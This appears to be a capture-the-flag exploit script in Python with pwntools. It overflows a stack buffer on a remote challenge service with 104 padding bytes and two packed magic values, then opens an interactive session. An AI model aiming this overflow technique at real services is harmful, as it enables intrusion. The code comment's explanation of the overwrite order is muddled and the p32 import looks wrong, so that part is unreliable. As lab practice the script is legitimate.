import pwn
from pwnlib.util.net import p32

p = pwn.remote('10.10.22.66','9002')
pwn.context.log_level = 'debug'
p.recv()

# local_c/rbp-0x4 expected value : 0xc0ff33
# local_10/rbp-0x8 expected value : 0xc0d3

# why we must put 0xc0de / rbp-0x8 first? because buffer overflow overwriting stack it wil overwriting the biggest 0x first 
p.sendlineafter(' ',b'A'*104+ p32(0xc0d3) + p32(0xc0ff33) )
p.interactive()
